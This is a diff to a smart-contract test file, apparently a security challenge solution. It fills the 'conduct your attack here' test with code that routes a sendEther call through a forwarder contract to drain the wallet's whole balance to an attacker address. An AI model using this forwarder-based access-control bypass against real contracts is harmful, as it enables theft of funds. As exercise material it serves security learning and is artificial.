@@ -36,7 +36,14 @@ describe(NAME, function () {
       );
     });
 
-    it("conduct your attack here", async function () {});
+    it("conduct your attack here", async function () {
+      const balance = await ethers.provider.getBalance(walletContract.address);
+      const data = walletContract.interface.encodeFunctionData("sendEther", [
+        attackerWallet.address,
+        balance,
+      ]);
+      await forwarderContract.functionCall(walletContract.address, data);
+    });
 
     after(async function () {
       const attackerWalletBalanceAfter = await ethers.provider.getBalance(
